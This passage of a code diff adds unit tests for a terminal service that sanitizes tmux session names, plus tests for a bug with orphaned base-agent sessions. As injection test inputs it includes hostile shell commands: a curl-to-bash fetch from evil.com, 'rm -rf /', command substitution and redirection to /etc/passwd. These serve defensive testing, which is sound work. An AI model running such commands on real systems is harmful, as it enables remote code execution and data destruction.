+      expect(sessionName).not.toContain(';')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes double quotes', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-1"; malicious')
+      expect(sessionName).not.toContain('"')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes greater-than for output redirection', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-1 > /etc/passwd')
+      expect(sessionName).not.toContain('>')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes less-than for input redirection', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-1 < /etc/passwd')
+      expect(sessionName).not.toContain('<')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('only allows alphanumeric, hyphens, and underscores', () => {
+      const maliciousInput = 'agent-1;|&`$(){}[]<>\\\'"\n\r\t!@#%^*=+'
+      const sessionName = terminalService.getTmuxSessionName(maliciousInput)
+
+      // Verify only safe characters remain
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('handles a real-world attack payload', () => {
+      // This is a common shell injection pattern
+      const attackPayload = 'test"; curl http://evil.com/shell.sh | bash; echo "'
+      const sessionName = terminalService.getTmuxSessionName(attackPayload)
+
+      expect(sessionName).not.toContain(';')
+      expect(sessionName).not.toContain('|')
+      expect(sessionName).not.toContain('"')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+  })
+
+  describe('killTmuxSession - safe execution', () => {
+    it('does not throw with malicious session names due to sanitization', () => {
+      // The implementation uses execFileSync with argument arrays
+      // Even if someone tries to inject commands, the sanitization prevents execution
+      const maliciousNames = [
+        'agent-1; rm -rf /',
+        'agent-$(whoami)',
+        'agent-`id`',
+        'agent-1 && echo pwned'
+      ]
+
+      for (const name of maliciousNames) {
+        // Should not throw - the name gets sanitized before being used
+        expect(() => terminalService.killTmuxSession(name)).not.toThrow()
+      }
+    })
+  })
+})
+
+/**
+ * BUG TEST: Base branch agent terminal with orphaned tmux session
+ *
+ * This test catches a bug where clicking on a base branch agent's terminal
+ * when a tmux session already exists (but is empty/orphaned) causes the code
+ * to just attach to the empty session instead of spawning Claude.
+ *
+ * Root cause:
+ * - Lines 688-700: tmuxSessionExists() check sets attachToExistingTmux = true
+ * - Lines 1100-1106: When attachToExistingTmux = true, it just runs `tmux attach-session`
+ *   without spawning Claude
+ *
+ * Expected behavior:
+ * - When clicking on a base agent terminal, if tmux session exists BUT is empty/no Claude
+ *   running, it should kill the session and start fresh with Claude
+ * - OR always ensure Claude gets spawned in the session
+ */
+describe('BUG: Base agent terminal with orphaned tmux session', () => {
+  let terminalService: TerminalService
+  let mockMainWindow: any
+  let mockPty: any
+  let mockSettingsService: any
+  let mockAgentService: any
+
+  beforeEach(() => {
+    vi.clearAllMocks()
+    vi.useFakeTimers()
+
+    const windowMocks = createMockMainWindow()
+    mockMainWindow = windowMocks.mainWindow
+    mockPty = createMockPty()
+    mockSettingsService = createMockSettingsService('tmux')
+    mockAgentService = {
+      ...createMockAgentService(),
+      // Return base branch agent info
+      readAgentInfo: vi.fn().mockResolvedValue({
+        agentId: 'myproject-base',
+        isBaseBranchAgent: true,
+        tool: 'claude',
+        mode: 'dev',
+        status: 'idle'
+      })
+    }
+    setupDefaultMocks(mockPty)
+    terminalService = new TerminalService(mockMainWindow)
+    terminalService.setAgentService(mockAgentService)
+    terminalService.setSettingsService(mockSettingsService)
+  })
+
+  afterEach(() => {
+    vi.clearAllMocks()
+    vi.useRealTimers()
+  })
+
+  it('should spawn Claude when tmux session exists but is empty (base agent)', async () => {
+    // Scenario: User has a base agent. The tmux session exists (maybe from a previous
+    // app session, crash, or orphaned state), but Claude is NOT running in it.
+    // User clicks on the base agent terminal to start working.
+
+    // Mock: tmux is available AND session exists (orphaned/empty)
+    vi.mocked(execSync).mockImplementation((cmd: string) => {
+      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+      if (cmd.includes('has-session')) return Buffer.from('') // Session exists
+      if (cmd.includes('list-sessions')) return 'minion-myproject-base:0\n' // Not attached
+      return Buffer.from('')
+    })
+    // Mock has-session check using execFileSync to indicate session EXISTS
+    vi.mocked(execFileSync).mockImplementation((_cmd: string, _args?: readonly string[]) => {
+      // Session exists - don't throw
+      return Buffer.from('')
+    })
+
+    // Start the base agent (simulating user clicking on the terminal)
+    await terminalService.startAgent(
+      '/path/to/project', // Base agents work in the main project directory
+      'myproject-base',   // Base agent ID pattern
+      'claude',
+      'dev'
+    )
+
+    // Advance timers to trigger any delayed commands
+    await vi.advanceTimersByTimeAsync(150)
+
+    // Get what was written to the terminal
+    const writeCalls = mockPty.write.mock.calls
+    expect(writeCalls.length).toBeGreaterThanOrEqual(1)
+
+    const writtenCommand = writeCalls[0][0]
+
+    // BUG FIX: Current code kills orphaned session and creates new with Claude
+    // The fix writes Claude command to a script file, then runs via tmux
+    //
+    // EXPECTED: Claude should be spawned. Either:
+    // 1. Kill the orphaned session and create new with Claude: `tmux new-session ... send-keys 'claude ...'`
+    // 2. OR send Claude command to existing session: `tmux send-keys -t session 'claude ...'`
+    //
+    // Check that Claude command is in the script file (tmux mode uses script files)
+    const claudeInScriptFile = vi.mocked(fs.writeFileSync).mock.calls.some(
+      (call: any[]) => String(call[1]).includes('claude')
+    )
+    const claudeInTerminalWrites = writtenCommand.includes('claude')
+    expect(claudeInScriptFile || claudeInTerminalWrites).toBe(true)
+
+    // Additional verification: it should NOT just be a bare attach-session
+    // A bare attach without Claude spawn is the bug behavior
+    const isBareAttach = writtenCommand.includes('attach-session') && !claudeInScriptFile
+    expect(isBareAttach).toBe(false)
+  })
+
+  it('should ensure Claude is running after connecting to existing tmux session', async () => {
+    // Similar scenario but verifying Claude command is actually sent to the session
+
+    vi.mocked(execSync).mockImplementation((cmd: string) => {
+      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+      if (cmd.includes('has-session')) return Buffer.from('')
+      if (cmd.includes('list-sessions')) return 'minion-myproject-base:0\n'
+      return Buffer.from('')
+    })
+    vi.mocked(execFileSync).mockImplementation((_cmd: string, _args?: readonly string[]) => {
+      return Buffer.from('')
+    })
+
+    await terminalService.startAgent(
+      '/path/to/project',
+      'myproject-base',
+      'claude',
+      'dev',
+      'Fix the authentication bug' // User provides a prompt
+    )
+
+    await vi.advanceTimersByTimeAsync(150)
+
+    const writeCalls = mockPty.write.mock.calls
+    expect(writeCalls.length).toBeGreaterThanOrEqual(1)
+
+    // All write calls combined should include the Claude command
+    const allWrites = writeCalls.map((c: any[]) => c[0]).join('')
+
+    // BUG FIX: Claude command is written to script file in tmux mode
+    // Check that Claude command is in either terminal writes or script file
+    const claudeInScriptFile = vi.mocked(fs.writeFileSync).mock.calls.some(
+      (call: any[]) => String(call[1]).includes('claude')
+    )
+    const claudeInTerminalWrites = allWrites.includes('claude')
+    expect(claudeInScriptFile || claudeInTerminalWrites).toBe(true)
+
+    // The prompt should also be included somewhere (either in command or script file)
+    // With the bug, the prompt "Fix the authentication bug" is never sent
+    // This test will FAIL demonstrating the bug
+    const promptIncluded = allWrites.includes('Fix the authentication bug') ||
+      vi.mocked(fs.writeFileSync).mock.calls.some(
+        (call: any[]) => String(call[1]).includes('Fix the authentication bug')
+      )
+    expect(promptIncluded).toBe(true)
+  })
+
+  it('should handle base agent restart when previous session was killed but tmux session lingers', async () => {
+    // Edge case: User stops an agent (which should kill tmux), but due to timing or error,
+    // the tmux session is still there. On restart, Claude should still be spawned.
+
+    vi.mocked(execSync).mockImplementation((cmd: string) => {
+      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+      if (cmd.includes('has-session')) return Buffer.from('') // Orphaned session still exists
+      if (cmd.includes('list-sessions')) return 'minion-myproject-base:0\n'
+      return Buffer.from('')
+    })
+    vi.mocked(execFileSync).mockImplementation((_cmd: string, _args?: readonly string[]) => {
+      return Buffer.from('')
+    })
+
+    // Agent info shows it was previously stopped but tmux lingers
+    mockAgentService.readAgentInfo.mockResolvedValue({
+      agentId: 'myproject-base',
+      isBaseBranchAgent: true,
+      tool: 'claude',
+      mode: 'dev',
+      status: 'stopped', // Previously stopped
+      claudeSessionId: null, // No active Claude session
+      claudeSessionActive: false
+    })
+
+    await terminalService.startAgent(
+      '/path/to/project',
+      'myproject-base',
+      'claude',
+      'dev'
+    )
+
+    await vi.advanceTimersByTimeAsync(150)
+
+    const writeCalls = mockPty.write.mock.calls
+    expect(writeCalls.length).toBeGreaterThanOrEqual(1)
+
+    const allWrites = writeCalls.map((c: any[]) => c[0]).join('')
+
+    // Even though tmux session exists, Claude should be spawned because
+    // there's no active Claude session (claudeSessionActive: false)
+    // BUG FIX: Code now checks if Claude is running in tmux, kills orphaned sessions
+    const claudeInScriptFile = vi.mocked(fs.writeFileSync).mock.calls.some(
+      (call: any[]) => String(call[1]).includes('claude')
+    )
+    const claudeInTerminalWrites = allWrites.includes('claude')
+    expect(claudeInScriptFile || claudeInTerminalWrites).toBe(true)
+  })
+})
+
